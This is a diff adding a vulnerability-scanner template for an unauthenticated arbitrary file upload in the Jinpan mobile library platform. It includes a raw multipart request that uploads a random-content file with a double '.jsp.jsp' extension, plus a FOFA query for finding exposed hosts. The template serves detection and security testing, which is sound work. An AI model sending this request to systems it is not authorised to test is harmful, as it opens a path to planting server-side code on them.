@@ -1,0 +1,48 @@
+id: jinpan-doupload-fileupload
+
+info:
+  name: 金盘移动图书馆 doUpload.jsp 任意文件上传
+  author: zan8in
+  severity: critical
+  description: |
+    金盘图书馆微信/移动管理平台 /pages/admin/tools/uploadFile/doUpload.jsp 未授权可上传文件，JSON 回显 filePaths/fileNames/uploadFileNames。
+  reference:
+    - https://mp.weixin.qq.com/s/vbuu5Dh7SshVtMVjJKaLKg
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="金盘软件-金盘移动图书馆系统"
+  tags: jinpan,goldlib,fileupload
+
+variables:
+  filename: "{{rand_base(6)}}"
+  bodystr: "{{rand_base(16)}}"
+  boundary: "{{rand_base(8)}}"
+
+http:
+  - raw:
+      - |
+        POST /pages/admin/tools/uploadFile/doUpload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{boundary}}
+
+        ------WebKitFormBoundary{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp.jsp"
+        Content-Type: image/jpeg
+
+        {{bodystr}}
+        ------WebKitFormBoundary{{boundary}}--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"filePaths":'
+          - '"fileNames":'
+          - '"fileSizes":'
+          - '"uploadFileNames":'
+        condition: and
+      - type: status
+        status:
+          - 200
